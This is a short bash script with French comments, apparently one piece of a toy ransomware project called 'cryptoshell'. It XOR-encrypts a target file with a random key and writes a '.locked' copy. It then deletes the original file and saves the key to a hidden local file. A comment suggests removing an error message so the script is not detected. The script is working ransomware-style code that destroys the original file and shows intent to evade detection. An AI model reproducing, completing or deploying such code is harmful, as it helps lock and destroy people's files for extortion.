#!/bin/bash
. xor_helper.sh

#verifier si 1 parametres sont passer en argument 

if [ $# -ne 1 ] ; then 
    echo "usage : ./encrypt.sh <fichier>"
    exit 1
fi

#virifier si le fichier existe

if [ ! -f "$1" ] ; then 
    echo "fichier invalide" 
    #possibilite de supprimer ce message pour ne pas etre detetcer 
    exit 1 
fi


key=$(generate_key 8)
locked="$1.locked"
xor_file "$1" "$locked" "$key"
rm "$1"
echo "$key" > .cryptoshell_key
